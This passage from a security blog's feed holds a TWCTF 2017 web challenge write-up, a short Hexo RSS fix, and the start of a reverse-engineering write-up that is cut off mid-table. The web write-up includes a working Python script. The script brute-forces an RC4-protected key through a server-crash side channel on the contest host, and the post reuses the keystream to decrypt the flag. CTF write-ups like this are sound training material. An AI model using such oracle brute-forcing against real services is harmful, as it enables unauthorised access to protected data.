class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request</div><div class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> os</div><div class="line">app = Flask(__name__)</div><div class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///./db.sqlite3'</span></div><div class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="keyword">True</span></div><div class="line">app.secret_key = os.environ[<span class="string">'SECRET_KEY'</span>]</div><div class="line">db = SQLAlchemy(app)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span><span class="params">(db.Model)</span>:</span></div><div class="line">    __tablename__ = <span class="string">'data'</span></div><div class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</div><div class="line">    key = db.Column(db.String)</div><div class="line">    data = db.Column(db.String)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, data)</span>:</span></div><div class="line">        self.key = key</div><div class="line">        self.data = data</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;Data id:&#123;&#125;, key:&#123;&#125;, data:&#123;&#125;&gt;'</span>.format(self.id, self.key, self.data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key=app.secret_key)</span>:</span></div><div class="line">        self.stream = self.PRGA(self.KSA(key))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(self, c)</span>:</span></div><div class="line">        <span class="keyword">return</span> chr(ord(c) ^ next(self.stream))</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KSA</span><span class="params">(key)</span>:</span></div><div class="line">        keylen = len(key)</div><div class="line">        S = list(range(<span class="number">256</span>))</div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">            j = j + S[i] + ord(key[i % keylen]) &amp; <span class="number">255</span></div><div class="line">            S[i], S[j] = S[j], S[i]</div><div class="line"></div><div class="line">        <span class="keyword">return</span> S</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PRGA</span><span class="params">(S)</span>:</span></div><div class="line">        i = <span class="number">0</span></div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            i = i + <span class="number">1</span> &amp; <span class="number">255</span></div><div class="line">            j = j + S[i] &amp; <span class="number">255</span></div><div class="line">            S[i], S[j] = S[j], S[i]</div><div class="line">            <span class="keyword">yield</span> S[S[i] + S[j] &amp; <span class="number">255</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(enc_pass, input_pass)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(enc_pass) != len(input_pass):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(enc_pass, input_pass):</div><div class="line">        <span class="keyword">if</span> x != rc4.enc(y):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.before_first_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    db.create_all()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> Data.query.get(<span class="number">1</span>):</div><div class="line">        key = os.environ[<span class="string">'KEY'</span>]</div><div class="line">        data = os.environ[<span class="string">'FLAG'</span>]</div><div class="line">        rc4 = RC4()</div><div class="line">        enckey = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> key:</div><div class="line">            enckey += rc4.enc(c)</div><div class="line"></div><div class="line">        rc4 = RC4(key)</div><div class="line">        encdata = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> data:</div><div class="line">            encdata += rc4.enc(c)</div><div class="line"></div><div class="line">        flag = Data(enckey, encdata)</div><div class="line">        db.session.add(flag)</div><div class="line">        db.session.commit()</div><div class="line"></div><div class="line"><span class="meta">@app.route('/api/data', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">()</span>:</span></div><div class="line">    req = request.json</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">'data'</span>, <span class="string">'key'</span>]:</div><div class="line">        <span class="keyword">if</span> k <span class="keyword">not</span>-<span class="keyword">in</span> req:</div><div class="line">            <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    key, data = req[<span class="string">'key'</span>], req[<span class="string">'data'</span>]</div><div class="line">    <span class="keyword">if</span> len(key) &lt; <span class="number">8</span> <span class="keyword">or</span> len(data) == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    enckey = <span class="string">''</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> key:</div><div class="line">        enckey += rc4.enc(c)</div><div class="line"></div><div class="line">    encdata = <span class="string">''</span></div><div class="line">    rc4 = RC4(key)</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</div><div class="line">        encdata += rc4.enc(c)</div><div class="line"></div><div class="line">    newdata = Data(enckey, encdata)</div><div class="line">    db.session.add(newdata)</div><div class="line">    db.session.commit()</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>, id=newdata.id, data=newdata.data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/api/data/&lt;int:data_id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">(data_id)</span>:</span></div><div class="line">    data = Data.query.get(data_id)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>, data=data.data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/api/data/&lt;int:data_id&gt;/check', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(data_id)</span>:</span></div><div class="line">    data = Data.query.get(data_id)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    req = request.json</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">'key'</span>]:</div><div class="line">        <span class="keyword">if</span> k <span class="keyword">not</span>-<span class="keyword">in</span> req:</div><div class="line">            <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    enckey, key = data.key, req[<span class="string">'key'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verify(enckey, key):</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure></p>
<p>app.py 的工作流程约莫如下：</p>
<ol>
<li>建立第一个连接时通过init()，用RC4算法，先通过KEY得到enckey，再用enckey来加密FLAG，并保存到sqlite数据库中，对应的id为 1。</li>
<li>我们访问页面，传入数据和密钥，app.py通过new()，用RC4算法进行加密，并保存到sqlite数据库中，并返回加密的数据和对应的id。</li>
<li>通过id，访问 /api/data/<int:data_id> ，可以通过data()获得对应id的加密数据。</int:data_id></li>
<li>在页面中输入密钥，访问 /api/data/<int:data_id>/check ，可以通过check()对对应id的加密数据进行解密，并返回明文。</int:data_id></li>
</ol>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/5.png?raw=true" alt=""><br>上图返回的即为加密后的flag。</p>
<p>看一下check()函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(data_id)</span>:</span></div><div class="line">    data = Data.query.get(data_id)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    req = request.json</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">'key'</span>]:</div><div class="line">        <span class="keyword">if</span> k <span class="keyword">not</span>-<span class="keyword">in</span> req:</div><div class="line">            <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    enckey, key = data.key, req[<span class="string">'key'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verify(enckey, key):</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
<p>传入data_id，如果对应id的加密数据不存在中返回false，如果json数据格式包中没有key字段，直接返回false。之后通过<code>enckey, key = data.key, req[&#39;key&#39;]</code>，将加密数据用的enckey和我们传入的key分别保存到变量enckey和变量key中。接着利用verify(enckey, key)来判断key是否正确。接下来看一下verify()函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(enc_pass, input_pass)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(enc_pass) != len(input_pass):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(enc_pass, input_pass):</div><div class="line">        <span class="keyword">if</span> x != rc4.enc(y):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>
<p>首先是enc_pass和input_pass长度要相等。接着用<code>zip(enc_pass, input_pass)</code>，利用for循环，对input_pass的每个字母进行加密后，与enc_pass的每个字母进行比较，若有不同则返回false。所以这里要过两个关：</p>
<ol>
<li>长度</li>
<li>对应的字母相等。</li>
</ol>
<p>先说长度。我们只能根据服务器端返回来的信息来判断长度是否符合。我们传入的参数key，服务器端并没有验证它的类型，也就是说我们可以传入一个list，而不是一个字符串，这样同样能传入到verify()函数中。假如我们传入key为[null,null]，这里的len(input_pass)即为2，若<code>len(enc_pass) != len(input_pass)</code>，则服务器返回<code>False</code>，但若满足了长度要求，则会进行<code>zip(enc_pass, input_pass)</code>并对每个字符加密比较（注：null这里变成了None，原因待会说）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>encKey = <span class="string">"ab"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>key = [<span class="keyword">None</span>,<span class="keyword">None</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x,y <span class="keyword">in</span> zip(encKey,key):</div><div class="line"><span class="meta">... </span>    print(x,y)</div><div class="line">...</div><div class="line">a <span class="keyword">None</span></div><div class="line">b <span class="keyword">None</span></div></pre></td></tr></table></figure></p>
<p>在RC4的enc操作中用到了ord()：<code>chr(ord(c) ^ next(self.stream))</code>。对于None类型，ord(None)会崩溃掉。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>key = [<span class="keyword">None</span>,<span class="keyword">None</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ord(key[<span class="number">1</span>])</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">TypeError: ord() expected string of length <span class="number">1</span>, but NoneType found</div></pre></td></tr></table></figure></p>
<p>现在有了两种状态：False 和 Error。基于此即可得出真正key的长度。注意，服务器端接收的数据格式是JSON，在<a href="https://docs.python.org/3/library/json.html#encoders-and-decoders" target="_blank" rel="external">python的文档</a>中定义了json格式和python的转换:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/6.png?raw=true" alt=""></p>
<p>所以我们的key，正如前面提到的传入的list中，填的是null，这样服务器端会自动解码为None。</p>
<p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（15个null）时：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/7.png?raw=true" alt=""></p>
<p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>(16个null)时：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/8.png?raw=true" alt=""></p>
<p>这说明服务器端的encKey长度为16。</p>
<p>接下来考虑对应字符是否相等的问题，基于前面的思路，可以利用服务器端的两种状态：False 和 Error 来判断。再看一下verify()函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(enc_pass, input_pass)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(enc_pass) != len(input_pass):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(enc_pass, input_pass):</div><div class="line">        <span class="keyword">if</span> x != rc4.enc(y):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure></p>
<p>如果我们输入<code>key=[&quot;o&quot;,null,....,null]</code>，如果第一个字符<code>o</code>加密后恰好是encKey的第一个字符，那么它会去比较第二个字符即null，在下一次比较时会进行RC4.enc(y)，其中的ord(None)将会造成服务器的崩溃，这是状态一。如果第一个字符<code>1</code>加密后不是encKey的第一个字符，那么会直接返回False，这是状态二。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/10.png?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/11.png?raw=true" alt=""></p>
<p>基于此，可以逐步爆破出每个字符。下面给个利用脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">"http://s3.chal.ctf.westerns.tokyo/api/data/1/check"</span></div><div class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line">key = [<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>]</div><div class="line"></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</div><div class="line">		key[index] = str(chr(i))</div><div class="line">		payload = &#123;<span class="string">"key"</span>:key&#125;</div><div class="line">		text = requests.post(url,json=payload,proxies=proxy).text</div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"500 Internal Server Error"</span> <span class="keyword">in</span> text :</div><div class="line">			print(<span class="string">""</span>.join(key[:index+<span class="number">1</span>]))</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"true"</span> <span class="keyword">in</span> text:</div><div class="line">			print(<span class="string">""</span>.join(key))</div><div class="line">			exit()</div></pre></td></tr></table></figure></p>
<p>得到key为：t2gavAjbPtj9gyps</p>
<p>最后访问：<a href="http://s3.chal.ctf.westerns.tokyo/#/data/1" target="_blank" rel="external">http://s3.chal.ctf.westerns.tokyo/#/data/1</a> ，在key部分填上t2gavAjbPtj9gyps</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/14.png?raw=true" alt=""></p>
<p>即可得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;yet-an0ther-pyth0n-0racle&#125;</div></pre></td></tr></table></figure></p>
<p>还有另一种稍显麻烦的方法（可能，不是稍显hh）。RC4算法中，用先用key生成了一个字节串K，然后用这个字节串K与明文进行异或，从而得到密文。假如我们把FLAG密文当作明文，和key传入，服务器端用key生成的是同一个字节串K，然后把字节串K与FLAG密文进行异或，返回给我们的密文即为FLAG的明文。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/5.png?raw=true" alt=""></p>
<p>FLAG密文串为：<code>\fj\u00aa\u008cQd\u00aeg|\u0085i\&quot;\u0087b:$\u00e85Z\u00fa!R\u00dfE\u001d\u00b1)\u009e\u00d1F\u00d4*</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/16.png?raw=true" alt=""></p>
<p>可以看到这个id为81252而不是1，是我们新插入的“密文”。不过这有点不好，因为访问加密的数据是不需要身份验证的，只要访问的id正确，这个flag就会被人看到了，比如你访问id为81191的密文：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/17.png?raw=true" alt=""></p>
<p>不费吹灰之力之力就可以拿到flag。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TWCTF 2017-Super Secure Storage-writeup&lt;br&gt;python缓存 RC4 爆破&lt;/p&gt;
&lt;p&gt;重点：这是web题，不是Crypto&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>hexo-rss链接问题修复方法</title>
    <link href="http://chybeta.github.io/2017/09/04/hexo-rss%E9%93%BE%E6%8E%A5%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://chybeta.github.io/2017/09/04/hexo-rss链接问题修复方法/</id>
    <published>2017-09-04T02:04:44.000Z</published>
    <updated>2017-09-04T02:41:43.833Z</updated>
    
    <content type="html"><![CDATA[<p>hexo-rss链接问题修复方法<br><a id="more"></a></p>
<p>用 hexo-generator-feed 来生成hexo站点的rss，即 <a href="https://chybeta.github.io/atom.xml">https://chybeta.github.io/atom.xml</a> ，类似这样的：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170904/3.png?raw=true" alt=""></p>
<p>然后昨天有师傅说链接是错误的，全部是 yoursite.com</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170904/2.png?raw=true" alt=""></p>
<p>网上搜了一波没找到合适的答案，<a href="http://www.jianshu.com/p/a2fe56d11c4f" target="_blank" rel="external">http://www.jianshu.com/p/a2fe56d11c4f</a> 里提到的是全部手动修改，不现实。后面自己解决了一下。</p>
<p>打开博客目录的 _config.yml。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170904/1.png?raw=true" alt=""></p>
<p>将第15行左右的url改成你的站点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url: http://chybeta.github.io</div></pre></td></tr></table></figure></p>
<p>然后重新编译生成博客。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo g &amp;&amp; hexo d</div></pre></td></tr></table></figure></p>
<p>就ok啦。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170904/4.png?raw=true" alt=""></p>
<p>博客水水更健康~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo-rss链接问题修复方法&lt;br&gt;
    
    </summary>
    
      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="hexo" scheme="http://chybeta.github.io/tags/hexo/"/>
    
      <category term="rss" scheme="http://chybeta.github.io/tags/rss/"/>
    
  </entry>
  
  <entry>
    <title>TWCTF 2017-Rev Rev Rev-writeup</title>
    <link href="http://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/"/>
    <id>http://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/</id>
    <published>2017-09-02T04:58:21.000Z</published>
    <updated>2017-09-03T14:03:31.335Z</updated>
    
    <content type="html"><![CDATA[<p>TWCTF 2017-Rev Rev Rev-writeup<br>爆破。warmup题<br><a id="more"></a><br>题目提供了一个64位elf文件。用IDA打开后按f5没反应。gdb打开，进行动态调试。</p>
<p>程序的基本流程就是，将你的输入读入，然后做个加密处理，比较看是否正确。在0x0804866D处有一个strcmp，我们在这里下个断点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ b *0x0804866D</div><div class="line">Breakpoint 1 at 0x804866d</div></pre></td></tr></table></figure></p>
<p>然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: aaaa</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xffffd12b (&quot;yyyy&quot;)</div><div class="line">....</div><div class="line"></div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804866c:	push   eax</div><div class="line">=&gt; 0x804866d:	call   0x8048410 &lt;strcmp@plt&gt;</div><div class="line">   0x8048672:	add    esp,0x10</div><div class="line"></div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffffd12b (&quot;yyyy&quot;)</div><div class="line">arg[1]: 0x8048870 --&gt; 0x65d92941</div></pre></td></tr></table></figure></p>
<p>借助peda插件的帮忙，可以看到我们输入了<code>aaaa</code>后，经过加密变成了<code>yyyy</code>，并且与内存0x8048870处的数据比较。我们把这段内存提取出来看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/32bx 0x8048870</div><div class="line">0x8048870:	0x41	0x29	0xd9	0x65	0xa1	0xf1	0xe1	0xc9</div><div class="line">0x8048878:	0x19	0x09	0x93	0x13	0xa1	0x09	0xb9	0x49</div><div class="line">0x8048880:	0xb9	0x89	0xdd	0x61	0x31	0x69	0xa1	0xf1</div><div class="line">0x8048888:	0x71	0x21	0x9d	0xd5	0x3d	0x15	0xd5	0x00</div></pre></td></tr></table></figure></p>
<p>所以我们可以利用输入与断点结合的方式，获取每个可显示字符的加密后的结果，然后根据0x8048870处的数据反推出flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: abcdefghijklmnopqrstuvwxyz</div><div class="line"></div><div class="line">省略。</div><div class="line"></div><div class="line">gdb-peda$ x/26bx 0xffffd12b</div><div class="line">0xffffd12b:	0xa1	0x61	0xe1	0x11	0x91	0x51	0xd1	0x31</div><div class="line">0xffffd133:	0xb1	0x71	0xf1	0x09	0x89	0x49	0xc9	0x29</div><div class="line">0xffffd13b:	0xa9	0x69	0xe9	0x19	0x99	0x59	0xd9	0x39</div><div class="line">0xffffd143:	0xb9	0x79</div></pre></td></tr></table></figure>
<p>根据上面的调试结果，可以得出如下的对应关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">0xa1 =&gt; z</div><div class="line">0x61 =&gt; y</div><div class="line">0xe1 =&gt; x</div><div class="line">0x11 =&gt; w</div><div class="line">0x91 =&gt; v</div><div class="line">0x51 =&gt; u</div><div class="line">0xd1 =&gt; t</div><div class="line">0x31 =&gt; s</div><div class="line">0xb1 =&gt; r</div><div class="line">0x71 =&gt; q</div><div class="line">0xf1 =&gt; p</div><div class="line">0x09 =&gt; o</div><div class="line">0x89 =&gt; n</div><div class="line">0x49 =&gt; m</div><div class="line">0xc9 =&gt; l</div><div class="line">0x29 =&gt; k</div><div class="line">0xa9 =&gt; j</div><div class="line">0x69 =&gt; i</div><div class="line">0xe9 =&gt; h</div><div class="line">0x19 =&gt; g</div><div class="line">0x99 =&gt; f</div><div class="line">0x59 =&gt; e</div><div class="line">0xd9 =&gt; d</div><div class="line">0x39 =&gt; c</div><div 